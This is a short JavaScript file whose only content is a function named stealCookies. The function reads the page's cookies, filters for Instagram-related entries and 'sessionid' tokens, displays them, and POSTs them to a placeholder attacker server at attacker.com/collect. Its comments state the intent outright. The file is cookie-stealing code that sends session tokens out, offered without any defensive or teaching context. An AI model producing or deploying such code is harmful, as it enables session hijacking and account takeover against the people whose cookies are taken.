// script.js
async function stealCookies() {
    const output = document.getElementById('output');
    
    // Read all cookies from Instagram domain
    const cookies = document.cookie.split(';')
        .map(c => c.trim())
        .filter(c => c.includes('instagram.com') || c.includes('sessionid'))
        .join('\n');
    
    output.textContent = cookies;
    
    // Send to attacker server
    await fetch('https://attacker.com/collect', {
        method: 'POST',
        headers: {'Content-Type': 'text/plain'},
        body: cookies
    });
}
